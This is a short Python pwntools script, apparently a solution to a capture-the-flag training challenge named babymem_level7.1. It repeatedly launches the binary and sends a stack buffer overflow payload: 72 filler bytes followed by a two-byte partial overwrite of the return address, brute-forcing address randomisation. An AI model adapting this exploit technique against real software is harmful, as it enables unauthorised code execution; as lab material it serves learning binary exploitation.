
import pwn
while True:
	proc = pwn.process("/challenge/babymem_level7.1")
	proc.recvuntil("size:")
	proc.sendline("74")
	#ret_addr = pwn.p64(0x562addea28fc, endian='little')
	payload = b"a"*72 + b"\x2a\x14"
	proc.recvuntil("bytes)!")
	proc.send(payload)
	proc.interactive()
